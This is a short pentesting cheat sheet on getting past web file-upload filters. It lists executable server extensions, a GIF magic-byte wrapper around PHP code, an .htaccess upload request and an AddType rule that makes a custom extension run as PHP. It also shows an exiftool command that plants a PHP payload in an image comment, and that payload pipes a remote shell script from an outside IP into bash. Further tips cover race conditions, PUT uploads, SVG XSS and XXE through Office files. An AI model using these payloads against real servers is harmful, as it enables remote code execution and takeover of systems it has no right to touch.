# upload file cheat sheets



### useful files extensions :
-   **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
```
php
php2
php3
php4
php5
php6
php7
phps
pht
phtm
phtml
pgif
shtml
htaccess
phar
inc
```
-   **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
-   **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
-   **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
-   **Flash**: _.swf_
-   **Perl**: _.pl, .cgi_
-   **Erlang Yaws Web Server**: _.yaws_

## useful methods
- edit file path in header 
- bypass PHP metadata validation 
```
GIF89a1

<?php payload ?>

GIF89a1
```
-  Obfuscating : nullbyte | tricky name |  semi-colon ... 
```HTTP
POST /upload HTTP/1.1
Host: localhost

------WebKitFormBoundaryFc8zMoVPR7Y1FBvp
Content-Disposition: form-data; name="uploadfiles"; filename=".htaccess"
Content-Type: image/jpeg

```
- edit .htaccess | mime type 
```htaccess
AddType application/x-httpd-php .soraka
```
-  add the payload as comment in image - polygot payload
```bash
exiftool -Comment="<?php system('curl 10.8.129.32:5555/shell.sh | bash') ?>" wallpaper.jpg
```
- check for race-condition : tamper with uploads , 
- upload unexploitable files html , svg [ check 'same-origin' policy first ] - xss
- use another upload methods : PUT 
- try XXE using microsoft office files
- 